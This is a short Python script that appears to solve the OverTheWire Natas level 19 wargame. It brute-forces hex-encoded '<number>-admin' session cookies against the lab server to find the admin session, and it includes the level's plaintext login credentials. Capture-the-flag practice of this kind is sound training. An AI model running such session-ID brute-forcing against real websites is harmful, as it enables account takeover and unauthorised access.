import requests
def hex2ascii(s):
    ret = ""
    for c in s:
        coded = hex(ord(c))
        ret += coded[2:]
    return ret

auth = ('natas19', '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
url = 'http://natas19.natas.labs.overthewire.org/'
for i in range(1,640):
    a = hex2ascii(f"{i}-admin")
    cookies= {'PHPSSID':a}
    res = requests.get(url, auth=auth, cookies=cookies)
    print (i, hex2ascii(f"{i}-admin"))

    if 'regular user' not in res.text:
        print (res.text)
